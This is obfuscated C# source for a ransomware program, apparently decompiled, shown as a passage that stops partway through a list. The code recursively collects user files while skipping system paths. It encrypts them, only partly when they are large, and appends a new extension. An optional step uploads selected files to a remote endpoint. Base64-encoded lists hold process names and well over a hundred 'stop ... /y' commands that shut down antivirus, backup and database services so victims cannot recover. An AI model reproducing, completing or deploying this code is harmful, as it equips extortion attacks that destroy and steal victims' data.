using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AnfuKVjpYJAe;
using Microsoft.Win32;
using gPznSxQfWlHEl;

namespace ALzLGBAFaCqNDAE;

internal class RMvUnHFCuFhAD
{
	public class YVEcUYlJrkB
	{
		private static StringCollection hXcfESHYZiRI = new StringCollection();

		private static List<string> jczQjqdUClXE = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(tRvIdsqgaYol("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RECOVERY_FILES") && !text.EndsWith(".locked") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(hyxqjtznsfKrwU))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(pjQSJFkSbPitugtC) * 1024.0 * 1024.0 && mPFeTlWiYmzyc == "YES")
							{
								jczQjqdUClXE.Add(text);
							}
							else if (File.Exists(text) && mPFeTlWiYmzyc == "NO")
							{
								jczQjqdUClXE.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return jczQjqdUClXE;
		}
	}

	[CompilerGenerated]
	private sealed class GBkcAfOLaEBrMLn
	{
		public string[] kvtbUdpYRDQQEi;

		public void _003CMain_003Eb__7()
		{
			VIqeDgTaFytwA.LVNtphQMYcbo(kvtbUdpYRDQQEi);
		}
	}

	[CompilerGenerated]
	private sealed class ugYFoSXgdLkJRb
	{
		public string[] VsbqMQLtGMywx;

		public string[] mQLCgviydewiB;

		public string SHqkpJcVkNuDR;

		public string PFnTtYhyyTA;
	}

	[CompilerGenerated]
	private sealed class atGAoOsojcxkk
	{
		public ugYFoSXgdLkJRb HNvLLtbFBFkCe;

		public string IMOvhxnvGimrHd;

		public void _003CCrypt_003Eb__11()
		{
			GtCuHLfKarhCPsD(IMOvhxnvGimrHd, HNvLLtbFBFkCe.VsbqMQLtGMywx, HNvLLtbFBFkCe.PFnTtYhyyTA, HNvLLtbFBFkCe.mQLCgviydewiB, HNvLLtbFBFkCe.SHqkpJcVkNuDR);
		}
	}

	[CompilerGenerated]
	private sealed class TYiglANFMSMD
	{
		public List<string> WfIOVtmLPIN;

		public List<string> XTgVkZaFMXG;

		public string qauYyHqVQAZAcnu;

		public string[] AFchtFzGFzL;

		public string LMmzQuHrwNi;

		public void _003CWorkerCrypter2_003Eb__19(string t1)
		{
			foreach (string item in XTgVkZaFMXG)
			{
				if (AFchtFzGFzL.Length != 0)
				{
					string[] aFchtFzGFzL = AFchtFzGFzL;
					int num = 0;
					while (num < aFchtFzGFzL.Length)
					{
						string value = aFchtFzGFzL[num];
						string text = item.ToLower();
						if (!text.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0336;
					}
				}
				if (uLOfmffuUbO == "NO")
				{
					string text2 = item.ToLower();
					if (!text2.EndsWith(t1))
					{
						continue;
					}
				}
				if (PhPfWbXuhz.Contains(item))
				{
					continue;
				}
				if (xBPdwqHHEeht == "YES")
				{
					try
					{
						if (wFOcxFWrvvhtV.HfQhZOaQmZ(item))
						{
							wFOcxFWrvvhtV.DqAiciqTVTQ(item);
						}
					}
					catch
					{
					}
				}
				PhPfWbXuhz.Add(item);
				if (!CXucXEXIeDykT.Contains(Path.GetDirectoryName(item)))
				{
					CXucXEXIeDykT.Add(Path.GetDirectoryName(item));
				}
				QscgpGQBiZo(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception)
					{
						goto end_IL_00e8;
					}
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (jxOoqhbcgtBZFv == "YES" && fileStream.Length > Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024 && !WfIOVtmLPIN.Contains(t1))
					{
						if (ZwDUufGDCysrvCb == "YES")
						{
							foreach (string item2 in jjGwgfQeXEgM)
							{
								if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "YES")
								{
									if (Convert.ToInt32(XyJXNRlVrpoE) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "NO")
								{
									try
									{
										FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] array = null;
						byte[] array2 = GTRtlZMjZZbcvl.SYxHOqaALSG(item, Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024);
						array = (nXWsyPPQaMQrM ? aczLAIFWowAUpL.OoFqzHyRFT(array2, Encoding.ASCII.GetBytes(LMmzQuHrwNi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GTRtlZMjZZbcvl.uLcsZkADwbGAt(array2, Encoding.ASCII.GetBytes(LMmzQuHrwNi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
						GTRtlZMjZZbcvl.XzYjQpMihHQzL(item, array);
						if (qauYyHqVQAZAcnu != ".*")
						{
							File.Move(item, item + qauYyHqVQAZAcnu);
						}
					}
					else if (qauYyHqVQAZAcnu != ".*")
					{
						AUkxAhDnruHDH(item, item + qauYyHqVQAZAcnu, GZKrWxkSqjStYqoQ);
					}
					else
					{
						AUkxAhDnruHDH(item, item + ".part", GZKrWxkSqjStYqoQ);
					}
					end_IL_00e8:;
				}
				catch (Exception)
				{
				}
				IL_0336:;
			}
		}
	}

	[CompilerGenerated]
	private sealed class wcWLxteFbYriE
	{
		public string FpIodyWnjpq;

		public string kIAFvQpWUGDh;

		public void _003CEncrypt2_003Eb__1c()
		{
			while (true)
			{
				try
				{
					File.Delete(FpIodyWnjpq);
					break;
				}
				catch
				{
				}
			}
		}

		public void _003CEncrypt2_003Eb__1d()
		{
			while (true)
			{
				try
				{
					if (File.Exists(kIAFvQpWUGDh))
					{
						File.Delete(kIAFvQpWUGDh);
					}
					break;
				}
				catch
				{
				}
			}
		}
	}

	public static string UPUQwcTKGUAFdV = "EVET";

	public static string[] fUQJuEVXcZi;

	public static IEnumerable<DirectoryInfo> PzGOEetONcF;

	public static byte[] GZKrWxkSqjStYqoQ = null;

	public static DirectoryInfo PYAwVPKVNat;

	public static string mPFeTlWiYmzyc = "NO";

	public static string pjQSJFkSbPitugtC = "100000000";

	public static List<string> QbQwqgeXjhPl = new List<string>();

	public static List<string> TlqyRwJITQD = new List<string>();

	public static string xGUqmRVTnGlzAt = "NO";

	public static string LMmzQuHrwNi = "";

	public static string BrnILUGcSDPVh = "YES";

	public static int PydHXcNWICPd = 0;

	public static string xBPdwqHHEeht = "NO";

	public static string hzESjFSCFCQG = "NO";

	public static string iamMVuyXVE = "NO";

	public static string JuWoZYSBZswKhn = "0";

	public static string RsaJJHpVYrG = "NO";

	public static string ktvKzcyatb = "NO";

	public static string vLCPxvOFhStADi = "NO";

	public static string NkKzftIrHmxDtq = "YES";

	public static List<string> qylgWMXZJbFlMp = new List<string>
	{
		tRvIdsqgaYol("bHNhc3MuZXhl"),
		tRvIdsqgaYol("c3ZjaHN0LmV4ZQ=="),
		tRvIdsqgaYol("Y3Jjc3MuZXhl"),
		tRvIdsqgaYol("Y2hyb21lMzIuZXhl"),
		tRvIdsqgaYol("ZmlyZWZveC5leGU="),
		tRvIdsqgaYol("Y2FsYy5leGU="),
		tRvIdsqgaYol("bXlzcWxkLmV4ZQ=="),
		tRvIdsqgaYol("ZGxsaHN0LmV4ZQ=="),
		tRvIdsqgaYol("b3BlcmEzMi5leGU="),
		tRvIdsqgaYol("bWVtb3AuZXhl"),
		tRvIdsqgaYol("c3Bvb2xjdi5leGU="),
		tRvIdsqgaYol("Y3RmbW9tLmV4ZQ=="),
		tRvIdsqgaYol("U2t5cGVBcHAuZXhl")
	};

	public static List<string> CXucXEXIeDykT = new List<string>();

	public static string SgdnDdHIiKPpqsIk = "YES";

	public static string oEvTOxSckImq = "NO";

	public static string LMNFMFkYvKiWe = "NO";

	public static List<string> PhPfWbXuhz = new List<string>();

	public static string weoafCbZLH = "NO";

	private static string tMBqsPrhcJ = "32a0f201-ff34-4f3c-8659-8a8a5251212b";

	public static string fWvfvRzLwhw = "YES";

	public static string dxRbMtajUQT = "NO";

	public static List<string> AvzQMcUuTqVuYAb = new List<string>
	{
		tRvIdsqgaYol("c3RvcCBhdnBzdXMgL3k="),
		tRvIdsqgaYol("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBtZmV3YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBEZWZXYXRjaCAveQ=="),
		tRvIdsqgaYol("c3RvcCBjY0V2dE1nciAveQ=="),
		tRvIdsqgaYol("c3RvcCBjY1NldE1nciAveQ=="),
		tRvIdsqgaYol("c3RvcCBTYXZSb2FtIC95"),
		tRvIdsqgaYol("c3RvcCBSVFZzY2FuIC95"),
		tRvIdsqgaYol("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		tRvIdsqgaYol("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBZb29CYWNrdXAgL3k="),
		tRvIdsqgaYol("c3RvcCBZb29JVCAveQ=="),
		tRvIdsqgaYol("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		tRvIdsqgaYol("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		tRvIdsqgaYol("c3RvcCBWU05BUFZTUyAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCB2ZWVhbSAveQ=="),
		tRvIdsqgaYol("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBBY3JTY2gyU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		tRvIdsqgaYol("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBzb3Bob3MgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		tRvIdsqgaYol("c3RvcCBJSVNBZG1pbiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		tRvIdsqgaYol("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCBTYW1TcyAveQ=="),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		tRvIdsqgaYol("c3RvcCBQT1AzU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBTTVRQU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		tRvIdsqgaYol("c3RvcCBTc3RwU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		tRvIdsqgaYol("c3RvcCBVSTBEZXRlY3QgL3k="),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		tRvIdsqgaYol("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		tRvIdsqgaYol("c3RvcCBXM1N2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		tRvIdsqgaYol("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBNU09MQVAkVFBTIC95"),
		tRvIdsqgaYol("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		tRvIdsqgaYol("c3RvcCBBY3JTY2gyU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		tRvIdsqgaYol("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		tRvIdsqgaYol("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBBUlNNIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		tRvIdsqgaYol("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		tRvIdsqgaYol("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		tRvIdsqgaYol("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRQUk9EIC95"),
		tRvIdsqgaYol("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		tRvIdsqgaYol("c3RvcCBBbnRpdmlydXMgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		tRvIdsqgaYol("c3RvcCBBVlAgL3k="),
		tRvIdsqgaYol("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		tRvIdsqgaYol("c3RvcCBEQ0FnZW50IC95"),
		tRvIdsqgaYol("c3RvcCBiZWRiZyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		tRvIdsqgaYol("c3RvcCBFaHR0cFNydiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNTVMgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		tRvIdsqgaYol("c3RvcCBla3JuIC95"),
		tRvIdsqgaYol("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		tRvIdsqgaYol("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRUUFMgL3k="),
		tRvIdsqgaYol("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBudHJ0c2NhbiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		tRvIdsqgaYol("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		tRvIdsqgaYol("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tRvIdsqgaYol("c3RvcCBFU0hBU1JWIC95"),
		tRvIdsqgaYol("c3RvcCBTRFJTVkMgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		tRvIdsqgaYol("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		tRvIdsqgaYol("c3RvcCBLQVZGUyAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxXcml0ZXIgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		tRvIdsqgaYol("c3RvcCBLQVZGU0dUIC95"),
		tRvIdsqgaYol("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		tRvIdsqgaYol("c3RvcCBrYXZmc3NscCAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		tRvIdsqgaYol("c3RvcCBrbG5hZ2VudCAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		tRvIdsqgaYol("c3RvcCBtYWNtbnN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		tRvIdsqgaYol("c3RvcCBtYXN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		tRvIdsqgaYol("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		tRvIdsqgaYol("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		tRvIdsqgaYol("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		tRvIdsqgaYol("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		tRvIdsqgaYol("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		tRvIdsqgaYol("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		tRvIdsqgaYol("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		tRvIdsqgaYol("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		tRvIdsqgaYol("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNeVNRTDU3IC95"),
		tRvIdsqgaYol("c3RvcCBNY1NoaWVsZCAveQ=="),
		tRvIdsqgaYol("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		tRvIdsqgaYol("c3RvcCBNeVNRTDgwIC95"),
		tRvIdsqgaYol("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		tRvIdsqgaYol("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		tRvIdsqgaYol("c3RvcCBtZmVmaXJlIC95"),
		tRvIdsqgaYol("c3RvcCB3YmVuZ2luZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		tRvIdsqgaYol("c3RvcCBtZmVtbXMgL3k="),
		tRvIdsqgaYol("c3RvcCB3YmVuZ2luZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBSRVN2YyAveQ=="),
		tRvIdsqgaYol("c3RvcCBtZmV2dHAgL3k="),
		tRvIdsqgaYol("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		tRvIdsqgaYol("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		tRvIdsqgaYol("c3RvcCBzYWNzdnIgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		tRvIdsqgaYol("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		tRvIdsqgaYol("c3RvcCBTQVZTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		tRvIdsqgaYol("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		tRvIdsqgaYol("c3RvcCBTaE1vbml0b3IgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		tRvIdsqgaYol("c3RvcCBTbWNpbnN0IC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		tRvIdsqgaYol("c3RvcCBTbWNTZXJ2aWNlIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		tRvIdsqgaYol("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		tRvIdsqgaYol("c3RvcCBzb3Bob3NzcHMgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		tRvIdsqgaYol("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		tRvIdsqgaYol("c3RvcCBzd2lfZmlsdGVyIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
